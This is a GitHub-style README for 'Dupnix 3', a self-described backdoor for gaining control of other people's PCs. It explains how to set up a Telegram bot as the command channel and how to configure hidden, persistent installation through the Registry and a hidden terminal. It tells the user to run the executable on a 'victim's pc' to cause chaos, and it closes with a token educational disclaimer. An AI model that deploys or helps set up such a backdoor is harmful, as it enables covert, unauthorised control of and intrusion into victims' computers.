
# Dupnix 3

It's newer version of [DUPNIX3000](https://github.com/vende11s/dupnix3000), I needed to rebuild it, because i'm still learning programming and decided that building it from scratch would be better option than developing the old shitty code. 

## What is Dupnix 3?
Dupnix 3 is a **backdoor** you can use to gain control on a pc, troll sb, do a lot of things, the only limit is your imagination. If you had any problems with using Dupnix 3 - dm me, my discord is in my bio.
## Safety
Dupnix communicates to you through telegram, so nobody can detect who's on the other side.
<br> <br>Note: dupnix can be reverse engineered for example using burp suite so if victim is wise he can gain control over your telegram bot, read your channel, get your telegram id etc.

## Contents
- [Instalation](#Instalation)
    - [Telegram](#Telegram)
    - [Installation on victim pc](#Instalation-on-victim's-pc)
- [Usage](#Usage)
    - [Syntax](#Syntax)
    - [Commands](#Commands)
- [Todo](#Todo)
- [Contribution](#Contribution)
- [Why Dupnix 3?](#Why-Dupnix-3?)
- [Disclaimer](#Disclaimer)

## Instalation
### Telegram
#### Create a bot
- Start with texting `/newbot` to `@BotFather` on Telegram
- Name your bot 
- `BotFather` will send you ur **api token**, you'll need it later
- Text to him `/setPrivacy`, select ur bot and text him `Disable`
- Create a channel and add ur bot as admin
#### Get `chat_id`
- Text anything on the channel u created
- go to `https://api.telegram.org/bot<api Token>/getUpdates` 
- Find the `"id":` number, that's ur `chat_id`
### Json
- You need to create a json file which name is `dupnix-config.json`, in releases there is a template
    - `autostart <true/false>` automatically installs the Dupnix and runs it every pc boot
    - `hide_terminal <true/false>` who would expect that it hides the terminal?
    - `refresh_rate <seconds>` how often Dupnix checks if you sent some message
    - `id` sets id of this pc (useful when u controll more than one pc) 
    - `bot_token` token of bot you can get in [Telegram]("###Telegram") section
    - `chat_id` id of ur chat, get it in the [Telegram]("###Telegram") section
    - `path` path where u want the Dupnix to be (you can use `%sysdisk%` and `%username%`)

### Instalation on victim's pc
- Just run executable (in the directory where .json file is) and enjoy causing chaos!
## Usage
#### Autostart
* Dupnix is copied to the path specified in `dupnix-config.json` and is being added to autostart through Registry
#### Syntax u send on the telegram channel
 * `<ID> <Command> <Parameters>`
 * `<ID>` is set by you, you can also use `<INSTANCE_ID>` instead which is randomly generated, may be useful when more than one victim has the same ID
### [Commands](commands.md)

## Contribution
If you wanna do something then - contribute, please text me before that (my discord is in my bio) so we can work together!
## Why Dupnix 3?
Why Dupnix 3 is called Dupnix 3? On one of cash machines in my town there is sign DUPNIX, that's all.

## Disclaimer
Whole this project is only for eductional purposes, I am not responsible for anything you did or will do with this software.
